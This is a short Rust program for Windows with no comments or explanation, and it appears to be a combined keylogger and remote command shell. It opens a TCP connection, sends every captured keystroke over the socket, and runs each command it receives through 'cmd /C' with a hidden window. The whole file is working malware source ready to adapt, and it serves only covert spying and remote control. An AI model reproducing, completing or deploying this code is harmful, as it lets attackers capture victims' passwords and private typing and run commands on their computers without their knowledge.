use tokio::io::{self, AsyncReadExt, AsyncWriteExt};
use tokio::sync::mpsc;
use tokio::task;
use tokio::net::TcpStream;
use std::process::Command;
use std::os::windows::process::CommandExt;
use rdev::{Event, listen};

#[tokio::main]
async fn main() -> io::Result<()> {
    let socket = TcpStream::connect("127.0.0.1:7878").await?;
    let (mut rd, mut wr) = io::split(socket);
    let (sender, mut receiver) = mpsc::channel(8);

    task::spawn_blocking( || {
        let callback = move |event: Event| {
            match event.name {
                Some(string) => sender.blocking_send(string).expect(""),
                None => (),
            }
        };

        if let Err(error) = listen(callback) {
            println!("{:?}", error);
        }
    });

    tokio::spawn(async move {
        while let Some(string) = receiver.recv().await {
            wr.write_all(string.as_bytes()).await?;
        }

        Ok::<_, io::Error>(())
    });

    let mut buf = vec![0; 256];

    loop {
        let n = rd.read(&mut buf).await?;

        if n == 0 {
            break;
        }

        let command = std::str::from_utf8(&buf[..n]);
        
        match command {
            Ok(command) => {
                Command::new("cmd")
                    .args(["/C", command])
                    .creation_flags(0x08000000) 
                    .output()
                    .expect("failed to excute command");
            }
            Err(_) => println!("cannot decode bytes to str")
        }
    }

    Ok(())
}
